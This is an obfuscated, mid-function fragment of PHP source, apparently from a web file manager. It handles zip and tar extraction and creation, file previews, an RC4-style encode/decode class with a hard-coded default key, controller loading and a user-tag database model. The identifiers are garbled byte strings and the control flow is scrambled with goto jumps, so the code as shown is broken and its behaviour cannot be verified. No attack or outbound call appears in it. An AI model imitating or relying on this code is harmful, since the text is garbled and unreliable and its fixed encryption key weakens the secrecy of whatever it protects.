$E¸„‘äÑÚ->extract(PCLZIP_OPT_PATH, $Bîé‰—‡œ†, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Cµ¤Ø…”èÏ[1924], PCLZIP_OPT_REPLACE_NEWER); } return array($Cµ¤Ø…”èÏ[1031] => $bà£àƒêµ, $Cµ¤Ø…”èÏ[1033] => $E¸„‘äÑÚ->errorName(!0)); } } } return array($Cµ¤Ø…”èÏ[1031] => !1, $Cµ¤Ø…”èÏ[1033] => $Cµ¤Ø…”èÏ[1925]); goto C¤¬‹ÈÛÈ; C¤¬‹ÈÛÈ: } static function fileIndex($E‚›˜‹ÍÇª, $cöéŠò…Ø, $A‚õ¨Ãì³ = false) { goto fÒš¤¦§Úñ; c …á†Ë¨: $dÖù“ˆ‹×ğ = $E¾Úç™³Š; if ($A‚õ¨Ãì³) { $dÖù“ˆ‹×ğ = $E¾Úç™³Š[$A‚õ¨Ãì³]; if ($E¾Úç™³Š[$eĞ­Ş¾£Ì¹[76]]) { $dÖù“ˆ‹×ğ = rtrim($dÖù“ˆ‹×ğ, $eĞ­Ş¾£Ì¹[8]) . $eĞ­Ş¾£Ì¹[8]; } } return $dÖù“ˆ‹×ğ; goto bùŸë¯ê; câ¤Æî’›‹: $C”Ä‘¹ìõ = count($E‚›˜‹ÍÇª); for ($B¸©‡™ÎØ = 0; $B¸©‡™ÎØ < $C”Ä‘¹ìõ; $B¸©‡™ÎØ++) { if ($cöéŠò…Ø == $E‚›˜‹ÍÇª[$B¸©‡™ÎØ][$eĞ­Ş¾£Ì¹[1035]]) { $E¾Úç™³Š = $E‚›˜‹ÍÇª[$B¸©‡™ÎØ]; break; } } if (!$E¾Úç™³Š) { show_tips($eĞ­Ş¾£Ì¹[1926]); } goto c …á†Ë¨; fÒš¤¦§Úñ: $eĞ­Ş¾£Ì¹ =& $_SERVER[¼€¼ˆ¦‚¡]; self::init(); if (!is_array($E‚›˜‹ÍÇª)) { return !1; } goto câ¤Æî’›‹; bùŸë¯ê: } static function extractZipFile($f»½øÓ„Ş¦, $c·ïÈã”ÆÉ, $F„å±äˆƒÌ = false) { goto B®ªôŠ¢æª; cá¦Ø¥ö²†: if (!file_exists($A‹œÁ×‹Ì‡)) { return !1; } @rename($A‹œÁ×‹Ì‡, $d¹ğ˜“êŒ…); return $d¹ğ˜“êŒ…; goto bŠĞÖô·Ì‰; e§è£‚²ïï: $AĞ†¯äöŠ¼ = get_path_father($c·ïÈã”ÆÉ); if ($AĞ†¯äöŠ¼ == $c·ïÈã”ÆÉ) { $AĞ†¯äöŠ¼ = $FîÜšì„¹Ø[33]; } $b¸¶Õˆ÷Ö° = $bŒğ²òƒ‹ò->extract(PCLZIP_OPT_PATH, $DôšğäãÉ¿, PCLZIP_CB_PRE_FILE_NAME, $FîÜšì„¹Ø[1924], PCLZIP_OPT_REMOVE_PATH, $AĞ†¯äöŠ¼, PCLZIP_OPT_BY_NAME, $c·ïÈã”ÆÉ); goto cá¦Ø¥ö²†; AĞ„¦”ñ®: if (file_exists($d¹ğ˜“êŒ…)) { return $d¹ğ˜“êŒ…; } $bŒğ²òƒ‹ò = new PclZip($f»½øÓ„Ş¦); $A‹œÁ×‹Ì‡ = unzip_filter_ext($DôšğäãÉ¿ . get_path_this($c·ïÈã”ÆÉ)); goto e§è£‚²ïï; B®ªôŠ¢æª: $FîÜšì„¹Ø =& $_SERVER[¼€¼ˆ¦‚¡]; self::init(); $DôšğäãÉ¿ = TEMP_FILES . hash_path($f»½øÓ„Ş¦) . $FîÜšì„¹Ø[8]; goto Eá•µÄ¯Ä; Eá•µÄ¯Ä: mk_dir($DôšğäãÉ¿); $d¹ğ˜“êŒ… = $DôšğäãÉ¿ . md5($f»½øÓ„Ş¦ . $c·ïÈã”ÆÉ); if ($F„å±äˆƒÌ) { $d¹ğ˜“êŒ… = $DôšğäãÉ¿ . $F„å±äˆƒÌ; } goto AĞ„¦”ñ®; bŠĞÖô·Ì‰: } static function filePreview($eÓ¥«£ßè, $d©Ñèâåç§, $e¾ö ò‚©ì = false, $f·Ñ¾Îˆâ› = false) { goto BïìÀ™Œ˜Å; c¸Ò×½ö…«: $D”ß–¨±‰ = unzip_pre_name($D”ß–¨±‰); $AçãìØé®® = get_path_this($D”ß–¨±‰); $CÏå¹­òğ¸ = unzip_filter_ext($Bë“¹–«¨ù . $AçãìØé®®); goto Cğ‡¶¤ßÃ†; BïìÀ™Œ˜Å: $FôöëÏ³æ• =& $_SERVER[¼€¼ˆ¦‚¡]; self::init(); $Bë“¹–«¨ù = TEMP_FILES . hash_path($eÓ¥«£ßè) . $FôöëÏ³æ•[8]; goto a‹­ƒøÉöÜ; fËÇ°ù®¨¬: $D§Œ¨¯ƒÅË = self::extract($eÓ¥«£ßè, $Bë“¹–«¨ù, $d©Ñèâåç§, $D”ß–¨±‰); if (is_array($D”ß–¨±‰)) { show_json($FôöëÏ³æ•[1927], !1); } if (file_exists($dì°¡ÅÙ“è)) { IO::fileOut($dì°¡ÅÙ“è, $e¾ö ò‚©ì, get_path_this($D”ß–¨±‰)); return; } goto c¸Ò×½ö…«; a‹­ƒøÉöÜ: mk_dir($Bë“¹–«¨ù); $dì°¡ÅÙ“è = $Bë“¹–«¨ù . md5($eÓ¥«£ßè . $d©Ñèâåç§ . $f·Ñ¾Îˆâ›); $D”ß–¨±‰ = $FôöëÏ³æ•[33]; goto fËÇ°ù®¨¬; Cğ‡¶¤ßÃ†: if (!$D§Œ¨¯ƒÅË[$FôöëÏ³æ•[1031]]) { show_json($D§Œ¨¯ƒÅË[$FôöëÏ³æ•[1033]], !1); } if (!file_exists($CÏå¹­òğ¸)) { show_json($FôöëÏ³æ•[1928], !1); } @rename($CÏå¹­òğ¸, $dì°¡ÅÙ“è); goto bÃ¬¢¦×í; bÃ¬¢¦×í: if (!file_exists($dì°¡ÅÙ“è)) { del_dir($Bë“¹–«¨ù); show_json($FôöëÏ³æ•[1929]); } IO::fileOut($dì°¡ÅÙ“è, $e¾ö ò‚©ì, $AçãìØé®®); goto e©•ãäô²¯; e©•ãäô²¯: } static function create($D¢Ì¡ÔÇê·, $a›…¹—ˆ¶ç) { $Bõ¨ŞÚƒ‰à =& $_SERVER[¼€¼ˆ¦‚¡]; self::init(); $e”Á¥Øíã = get_path_ext($D¢Ì¡ÔÇê·); $d²´÷İ‰ = !1; if (self::checkIfType($e”Á¥Øíã, $Bõ¨ŞÚƒ‰à[301])) { if (kodZipArchive::support($Bõ¨ŞÚƒ‰à[1010])) { return kodZipArchive::create($D¢Ì¡ÔÇê·, $a›…¹—ˆ¶ç); } $D‡˜¶Ë¤Èù = new PclZip($D¢Ì¡ÔÇê·); foreach ($a›…¹—ˆ¶ç as $AåÔäÀ˜®î => $e”ñƒ²…òâ) { $e”ñƒ²…òâ = str_replace($Bõ¨ŞÚƒ‰à[467], $Bõ¨ŞÚƒ‰à[8], $e”ñƒ²…òâ); $CÒğ‰Áè¾ã = Kodio::clear(get_path_father($e”ñƒ²…òâ)); if ($AåÔäÀ˜®î == 0) { $d²´÷İ‰ = $D‡˜¶Ë¤Èù->create($e”ñƒ²…òâ, PCLZIP_OPT_REMOVE_PATH, $CÒğ‰Áè¾ã, PCLZIP_CB_PRE_FILE_NAME, $Bõ¨ŞÚƒ‰à[1930]); continue; } $d²´÷İ‰ = $D‡˜¶Ë¤Èù->add($e”ñƒ²…òâ, PCLZIP_OPT_REMOVE_PATH, $CÒğ‰Áè¾ã, PCLZIP_CB_PRE_FILE_NAME, $Bõ¨ŞÚƒ‰à[1930]); } } else { if (self::checkIfType($e”Á¥Øíã, $Bõ¨ŞÚƒ‰à[1901])) { foreach ($a›…¹—ˆ¶ç as $AåÔäÀ˜®î => $e”ñƒ²…òâ) { $e”ñƒ²…òâ = str_replace($Bõ¨ŞÚƒ‰à[467], $Bõ¨ŞÚƒ‰à[8], $e”ñƒ²…òâ); $CÒğ‰Áè¾ã = Kodio::clear(get_path_father($e”ñƒ²…òâ)); if ($AåÔäÀ˜®î == 0) { $d²´÷İ‰ = PclTarCreate($D¢Ì¡ÔÇê·, array($e”ñƒ²…òâ), $e”Á¥Øíã, null, $CÒğ‰Áè¾ã); continue; } $d²´÷İ‰ = PclTarAddList($D¢Ì¡ÔÇê·, array($e”ñƒ²…òâ), $Bõ¨ŞÚƒ‰à[33], $CÒğ‰Áè¾ã, $e”Á¥Øíã); } } } return $d²´÷İ‰; } } class Mcrypt { public static $defaultKey = "\x61\41\x74\x61\153\101\x3a\x64\154\155\x63\154\x64\105\x76\54\145"; public static function encode($F„¦÷Ÿ‘¨¿, $Fá”ÇÎäå = '', $BÅ¼ó¬Ò = 0, $d˜Ò˜¼ñÚÒ = '') { goto A¨¤Ù›˜‘; c«ŒƒØ…Œ: $DëÂëÇÒÕ½ = substr($d˜Ò˜¼ñÚÒ, -$dÃ«®Çë´); $dÃÀ„¦¥Ë = $cŸÃŒ±´âå . md5($cŸÃŒ±´âå . $DëÂëÇÒÕ½); $a‘öåÌÆ¾ = strlen($dÃÀ„¦¥Ë); goto e±Ïì†æç; c›º¯íÍÈß: $aä¨²áÖÉ = $Eëëì„Áì[33]; for ($A“Âˆà‰¸ = $aÎ×æ¢“ÙÉ = $eÓÃÅ£¯ó« = 0; $eÓÃÅ£¯ó« < $d‹ãğÆ«ƒ¬; $eÓÃÅ£¯ó«++) { $A“Âˆà‰¸ = ($A“Âˆà‰¸ + 1) % 256; $aÎ×æ¢“ÙÉ = ($aÎ×æ¢“ÙÉ + $CËÄ‡ˆ¼Ô‹[$A“Âˆà‰¸]) % 256; $b«¦„ÎãÚÍ = $CËÄ‡ˆ¼Ô‹[$A“Âˆà‰¸]; $CËÄ‡ˆ¼Ô‹[$A“Âˆà‰¸] = $CËÄ‡ˆ¼Ô‹[$aÎ×æ¢“ÙÉ]; $CËÄ‡ˆ¼Ô‹[$aÎ×æ¢“ÙÉ] = $b«¦„ÎãÚÍ; $aä¨²áÖÉ .= chr(ord($F„¦÷Ÿ‘¨¿[$eÓÃÅ£¯ó«]) ^ $CËÄ‡ˆ¼Ô‹[($CËÄ‡ˆ¼Ô‹[$A“Âˆà‰¸] + $CËÄ‡ˆ¼Ô‹[$aÎ×æ¢“ÙÉ]) % 256]); } $aä¨²áÖÉ = $DëÂëÇÒÕ½ . str_replace($Eëëì„Áì[906], $Eëëì„Áì[33], base64_encode($aä¨²áÖÉ)); goto AÂö‡ãÖ; e±Ïì†æç: $F„¦÷Ÿ‘¨¿ = sprintf($Eëëì„Áì[1931], $BÅ¼ó¬Ò ? $BÅ¼ó¬Ò + time() : 0) . substr(md5($F„¦÷Ÿ‘¨¿ . $E×Œö¡ÜŒ¦), 0, 16) . $F„¦÷Ÿ‘¨¿; $d‹ãğÆ«ƒ¬ = strlen($F„¦÷Ÿ‘¨¿); $b‚†Ş¾¬Ä‘ = array(); goto fÖñÜÉï©Ô; A¨¤Ù›˜‘: $Eëëì„Áì =& $_SERVER[¼€¼ˆ¦‚¡]; $dÃ«®Çë´ = 4; $Fá”ÇÎäå = md5($Fá”ÇÎäå ? $Fá”ÇÎäå : self::$defaultKey); goto e‡Ñ»îÙØ; AÂö‡ãÖ: $aä¨²áÖÉ = str_replace(array($Eëëì„Áì[284], $Eëëì„Áì[8], $Eëëì„Áì[906]), array($Eëëì„Áì[412], $Eëëì„Áì[70], $Eëëì„Áì[91]), $aä¨²áÖÉ); return $aä¨²áÖÉ; goto cøã˜£º§; e‡Ñ»îÙØ: $cŸÃŒ±´âå = md5(substr($Fá”ÇÎäå, 0, 16)); $E×Œö¡ÜŒ¦ = md5(substr($Fá”ÇÎäå, 16, 16)); $d˜Ò˜¼ñÚÒ = $d˜Ò˜¼ñÚÒ ? $d˜Ò˜¼ñÚÒ : md5(microtime()); goto c«ŒƒØ…Œ; fÖñÜÉï©Ô: for ($eÓÃÅ£¯ó« = 0; $eÓÃÅ£¯ó« <= 255; $eÓÃÅ£¯ó«++) { $b‚†Ş¾¬Ä‘[$eÓÃÅ£¯ó«] = ord($dÃÀ„¦¥Ë[$eÓÃÅ£¯ó« % $a‘öåÌÆ¾]); } $CËÄ‡ˆ¼Ô‹ = range(0, 255); for ($aÎ×æ¢“ÙÉ = $eÓÃÅ£¯ó« = 0; $eÓÃÅ£¯ó« < 256; $eÓÃÅ£¯ó«++) { $aÎ×æ¢“ÙÉ = ($aÎ×æ¢“ÙÉ + $CËÄ‡ˆ¼Ô‹[$eÓÃÅ£¯ó«] + $b‚†Ş¾¬Ä‘[$eÓÃÅ£¯ó«]) % 256; $b«¦„ÎãÚÍ = $CËÄ‡ˆ¼Ô‹[$eÓÃÅ£¯ó«]; $CËÄ‡ˆ¼Ô‹[$eÓÃÅ£¯ó«] = $CËÄ‡ˆ¼Ô‹[$aÎ×æ¢“ÙÉ]; $CËÄ‡ˆ¼Ô‹[$aÎ×æ¢“ÙÉ] = $b«¦„ÎãÚÍ; } goto c›º¯íÍÈß; cøã˜£º§: } public static function decode($b×Á¦Òù×ï, $b‚Ì”‡ ×Ô = '') { goto B¤ë‘Ê®à—; Dêãˆ‡šàè: $D’ĞÊ»ˆ  = $d‰î‘—º¡‘[33]; for ($B‚¼Ê¨ÎÛ = $bË†­Éê¶ˆ = $EĞ«‚ù‘¨ = 0; $EĞ«‚ù‘¨ < $D‰†ÙÄóšÕ; $EĞ«‚ù‘¨++) { $B‚¼Ê¨ÎÛ = ($B‚¼Ê¨ÎÛ + 1) % 256; $bË†­Éê¶ˆ = ($bË†­Éê¶ˆ + $DšøàÖ‹—ö[$B‚¼Ê¨ÎÛ]) % 256; $Cáò¢ÊÃõÏ = $DšøàÖ‹—ö[$B‚¼Ê¨ÎÛ]; $DšøàÖ‹—ö[$B‚¼Ê¨ÎÛ] = $DšøàÖ‹—ö[$bË†­Éê¶ˆ]; $DšøàÖ‹—ö[$bË†­Éê¶ˆ] = $Cáò¢ÊÃõÏ; $D’ĞÊ»ˆ  .= chr(ord($b×Á¦Òù×ï[$EĞ«‚ù‘¨]) ^ $DšøàÖ‹—ö[($DšøàÖ‹—ö[$B‚¼Ê¨ÎÛ] + $DšøàÖ‹—ö[$bË†­Éê¶ˆ]) % 256]); } $Fªæ×©öÂ¡ = intval(substr($D’ĞÊ»ˆ , 0, 10)); goto c÷‘¿¥æîã; eòÏŒ¢¬æ‰: $b×Á¦Òù×ï = base64_decode(substr($b×Á¦Òù×ï, $añ’·»½ˆø)); $D‰†ÙÄóšÕ = strlen($b×Á¦Òù×ï); $DÔ½ïŠì¤ = array(); goto D¡ÆóœöÎò; c÷‘¿¥æîã: if (($Fªæ×©öÂ¡ == 0 || $Fªæ×©öÂ¡ - time() > 0) && substr($D’ĞÊ»ˆ , 10, 16) == substr(md5(substr($D’ĞÊ»ˆ , 26) . $B®ß¶ÏŞàÒ), 0, 16)) { return substr($D’ĞÊ»ˆ , 26); } else { return $d‰î‘—º¡‘[33]; } goto Fİ¿˜¹•¦°; e¦×Ê¿ìĞ: $d±¥ÎÈÚµ = substr($b×Á¦Òù×ï, 0, $añ’·»½ˆø); $C•±áª‘¨Á = $e¯¦«¾‰ÈŞ . md5($e¯¦«¾‰ÈŞ . $d±¥ÎÈÚµ); $eø»‚µÛò” = strlen($C•±áª‘¨Á); goto eòÏŒ¢¬æ‰; D¡ÆóœöÎò: for ($EĞ«‚ù‘¨ = 0; $EĞ«‚ù‘¨ <= 255; $EĞ«‚ù‘¨++) { $DÔ½ïŠì¤[$EĞ«‚ù‘¨] = ord($C•±áª‘¨Á[$EĞ«‚ù‘¨ % $eø»‚µÛò”]); } $DšøàÖ‹—ö = range(0, 255); for ($bË†­Éê¶ˆ = $EĞ«‚ù‘¨ = 0; $EĞ«‚ù‘¨ < 256; $EĞ«‚ù‘¨++) { $bË†­Éê¶ˆ = ($bË†­Éê¶ˆ + $DšøàÖ‹—ö[$EĞ«‚ù‘¨] + $DÔ½ïŠì¤[$EĞ«‚ù‘¨]) % 256; $Cáò¢ÊÃõÏ = $DšøàÖ‹—ö[$EĞ«‚ù‘¨]; $DšøàÖ‹—ö[$EĞ«‚ù‘¨] = $DšøàÖ‹—ö[$bË†­Éê¶ˆ]; $DšøàÖ‹—ö[$bË†­Éê¶ˆ] = $Cáò¢ÊÃõÏ; } goto Dêãˆ‡šàè; Eìï‰«Ï®¢: $b‚Ì”‡ ×Ô = md5($b‚Ì”‡ ×Ô ? $b‚Ì”‡ ×Ô : self::$defaultKey); $e¯¦«¾‰ÈŞ = md5(substr($b‚Ì”‡ ×Ô, 0, 16)); $B®ß¶ÏŞàÒ = md5(substr($b‚Ì”‡ ×Ô, 16, 16)); goto e¦×Ê¿ìĞ; B¤ë‘Ê®à—: $d‰î‘—º¡‘ =& $_SERVER[¼€¼ˆ¦‚¡]; $b×Á¦Òù×ï = str_replace(array($d‰î‘—º¡‘[412], $d‰î‘—º¡‘[70], $d‰î‘—º¡‘[91]), array($d‰î‘—º¡‘[284], $d‰î‘—º¡‘[8], $d‰î‘—º¡‘[906]), $b×Á¦Òù×ï); $añ’·»½ˆø = 4; goto Eìï‰«Ï®¢; Fİ¿˜¹•¦°: } } define($_SERVER[¼€¼ˆ¦‚¡][1932], 1); goto DåİÊ°´ÚÆ; dó‹ã¿ß†¯: function Action($aóì©¬±Ù¶ = '') { goto Aê Ò†¹”é; c¸‰½Ó°ãË: if (isset($AÈºˆèª‘Í[$dÑ›äŒÛòº])) { return $AÈºˆèª‘Í[$dÑ›äŒÛòº]; } $aóì©¬±Ù¶ = trim(str_replace($E—š ÁÂ¨[4], $E—š ÁÂ¨[5], $aóì©¬±Ù¶), $E—š ÁÂ¨[4]); $Dï…Ç¢êŸ = explode($E—š ÁÂ¨[5], $aóì©¬±Ù¶); goto e‡¬¢¾‡¯; A¼”Ÿ–‘°¬: $AÈºˆèª‘Í[$E¶£„·‹ë²] = new $b±Ä©¶‚Å«(); $AÈºˆèª‘Í[$dÑ›äŒÛòº] = $AÈºˆèª‘Í[$E¶£„·‹ë²]; return $AÈºˆèª‘Í[$E¶£„·‹ë²]; goto A•ÔÍÔ°Û; e‡¬¢¾‡¯: $cä½‰ñÀÉ« = strtolower($Dï…Ç¢êŸ[0]); if (substr($cä½‰ñÀÉ«, -6) == $E—š ÁÂ¨[6]) { $aóì©¬±Ù¶ = substr($Dï…Ç¢êŸ[0], 0, -6); $b±Ä©¶‚Å« = $aóì©¬±Ù¶ . $E—š ÁÂ¨[7]; $DÇØò¶‚®¨ = $E—š ÁÂ¨[8]; if (isset($Dï…Ç¢êŸ[1]) && substr(strtolower($Dï…Ç¢êŸ[1]), -5) == $E—š ÁÂ¨[9]) { $b±Ä©¶‚Å« = $aóì©¬±Ù¶ . $Dï…Ç¢êŸ[1]; $DÇØò¶‚®¨ = $E—š ÁÂ¨[10] . $Dï…Ç¢êŸ[1] . $E—š ÁÂ¨[11]; } else { if (count($Dï…Ç¢êŸ) == 3) { $b±Ä©¶‚Å« = $aóì©¬±Ù¶ . $Dï…Ç¢êŸ[1] . $Dï…Ç¢êŸ[2]; $DÇØò¶‚®¨ = $E—š ÁÂ¨[12] . $Dï…Ç¢êŸ[1] . $E—š ÁÂ¨[13] . $Dï…Ç¢êŸ[2] . $E—š ÁÂ¨[11]; } } $DÇØò¶‚®¨ = PLUGIN_DIR . $aóì©¬±Ù¶ . $E—š ÁÂ¨[4] . $DÇØò¶‚®¨; } else { if (substr($cä½‰ñÀÉ«, -5) == $E—š ÁÂ¨[9]) { $aóì©¬±Ù¶ = substr($Dï…Ç¢êŸ[0], 0, -5); return Model($aóì©¬±Ù¶); } else { $b±Ä©¶‚Å« = $Dï…Ç¢êŸ[0] . $Dï…Ç¢êŸ[1]; $DÇØò¶‚®¨ = CONTROLLER_DIR . $Dï…Ç¢êŸ[0] . $E—š ÁÂ¨[4] . $Dï…Ç¢êŸ[1] . $E—š ÁÂ¨[14]; } } $E¶£„·‹ë² = strtolower($b±Ä©¶‚Å«); goto Cğ‡î¦©÷”; Aê Ò†¹”é: $E—š ÁÂ¨ =& $_SERVER[¿‰šÇ ]; static $AÈºˆèª‘Í = array(); $dÑ›äŒÛòº = $aóì©¬±Ù¶; goto c¸‰½Ó°ãË; Cğ‡î¦©÷”: if (isset($AÈºˆèª‘Í[$E¶£„·‹ë²])) { return $AÈºˆèª‘Í[$E¶£„·‹ë²]; } if (is_file($DÇØò¶‚®¨)) { include_once $DÇØò¶‚®¨; } if (!class_exists($b±Ä©¶‚Å«)) { return actionCallError("\133{$aóì©¬±Ù¶}\40\75\x3e\40{$b±Ä©¶‚Å«}\135\40\143\154\x61\163\163\x20\x6e\157\x74\40\x65\170\151\x73\164\163\41"); } goto A¼”Ÿ–‘°¬; A•ÔÍÔ°Û: } function ActionApply($A‰ƒœñªÊ„, $E‘Œà­«Ş° = array()) { goto F¼¨ õãø; c¬è„ÛƒÉ: $a¯ êÆøê = substr($A‰ƒœñªÊ„, 0, $Dñõ‹ÍÆƒ¿); $f¦ãâŒÙ„ = substr($A‰ƒœñªÊ„, $Dñõ‹ÍÆƒ¿ + 1); $fÊ®«Œ î… = Action($a¯ êÆøê); goto aœ¬š¯Ùø‚; F¼¨ õãø: if (is_array($A‰ƒœñªÊ„)) { return call_user_func_array($A‰ƒœñªÊ„, $E‘Œà­«Ş°); } if (function_exists($A‰ƒœñªÊ„)) { return call_user_func_array($A‰ƒœñªÊ„, $E‘Œà­«Ş°); } $Dñõ‹ÍÆƒ¿ = strrpos($A‰ƒœñªÊ„, $_SERVER[¿‰šÇ ][5]); goto c¬è„ÛƒÉ; aœ¬š¯Ùø‚: if (!method_exists($fÊ®«Œ î…, $f¦ãâŒÙ„)) { return actionCallError("{$A‰ƒœñªÊ„}\40\155\145\164\150\x6f\144\40\156\157\164\x20\145\170\151\163\164\x73\x21"); } $EÅ“øØ¡ø× = call_user_func_array(array($fÊ®«Œ î…, $f¦ãâŒÙ„), $E‘Œà­«Ş°); return $EÅ“øØ¡ø×; goto Aë—·Ä´›™; Aë—·Ä´›™: } function actionCallError($F‹¹ñ¿ºæ·) { $B…Æ°éì·… =& $_SERVER[¿‰šÇ ]; $aÃÀíÙ†ãò = json_encode_force(array($B…Æ°éì·…[15] => this_url(), $B…Æ°éì·…[16] => $GLOBALS[$B…Æ°éì·…[16]])); $aÃÀíÙ†ãò = str_replace(array($B…Æ°éì·…[17]), array($B…Æ°éì·…[4]), $aÃÀíÙ†ãò); return write_log($F‹¹ñ¿ºæ· . $B…Æ°éì·…[18] . $aÃÀíÙ†ãò, $B…Æ°éì·…[19]); } goto FÖ®óÃ×™; cĞîÉÎ·: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($CëÉ¿äóã) { $d›®İî„† =& $_SERVER[¼€¼ˆ¦‚¡]; return array($d›®İî„†[2491] => array(USER_ID, $d›®İî„†[2546])); } protected function listData() { $EØìœ±­à =& $_SERVER[¼€¼ˆ¦‚¡]; $F—¿¶Ö—åö = array($EØìœ±­à[1428] => USER_ID, $EØìœ±­à[436] => array($EØìœ±­à[2547], 0)); $dƒ¶»ô½ˆÌ = $EØìœ±­à[2548]; $AÇóè­¿†ñ = $EØìœ±­à[2549]; $f†Åõøñ§› = $this->field($dƒ¶»ô½ˆÌ)->where($F—¿¶Ö—åö)->order($AÇóè­¿†ñ)->select(); return $f†Åõøñ§› ? $f†Åõøñ§› : array(); } protected function listByTag($b‚ÖéÍê÷) { } protected function addToTag($B„°³–µ‚, $Då…Œ§æ¶) { $F‹‡Ë¯‚ã =& $_SERVER[¼€¼ˆ¦‚¡]; if (!Model($F‹‡Ë¯‚ã[2318])->listData($Då…Œ§æ¶) || !Model($F‹‡Ë¯‚ã[749])->pathInfo($B„°³–µ‚)) { return !1; } $F‹¾õŸ–áç = array($F‹‡Ë¯‚ã[1428] => USER_ID, $F‹‡Ë¯‚ã[436] => $Då…Œ§æ¶, $F‹‡Ë¯‚ã[387] => $B„°³–µ‚, $F‹‡Ë¯‚ã[388] => $F‹‡Ë¯‚ã[382], $F‹‡Ë¯‚ã[386] => $F‹‡Ë¯‚ã[33], $F‹‡Ë¯‚ã[2109] => 0); if ($this->where($F‹¾õŸ–áç)->find()) { return !1; } return $this->add($F‹¾õŸ–áç); } protected function removeFromTag($e„Â©ºé·×, $A¾‡¤Ë£¼¹) { $DôÎ÷…Í =& $_SERVER[¼€¼ˆ¦‚¡]; if (!Model($DôÎ÷…Í[2318])->listData($A¾‡¤Ë£¼¹)) { return !1; } if (is_array($e„Â©ºé·×)) { $e„Â©ºé·× = array($DôÎ÷…Í[7], $e„Â©ºé·×); } $eñ ˆÂ§ò = array($DôÎ÷…Í[1428] => USER_ID, $DôÎ÷…Í[436] => $A¾‡¤Ë£¼¹, $DôÎ÷…Í[388] => $DôÎ÷…Í[382], $DôÎ÷…Í[387] => $e„Â©ºé·×); return $this->where($eñ ˆÂ§ò)->delete(); } protected function removeByTag($B™±·‰ÇÆê) { $a™Æ«‰…¬Ñ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$B™±·‰ÇÆê) { return !1; } $bßŠ¦°ÙÎ’ = array($a™Æ«‰…¬Ñ[1428] => USER_ID, $a™Æ«‰…¬Ñ[436] => $B™±·‰ÇÆê); return $this->where($bßŠ¦°ÙÎ’)->delete(); } protected function removeBySource($C‘§äÜ“µ”) { $EÛØĞ³Ø²‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $c£ÇîÍÈÙ¤ = array($EÛØĞ³Ø²‰[1428] => USER_ID, $EÛØĞ³Ø²‰[387] => $C‘§äÜ“µ”, $EÛØĞ³Ø²‰[436] => array($EÛØĞ³Ø²‰[927], 0)); return $this->where($c£ÇîÍÈÙ¤)->delete(); } }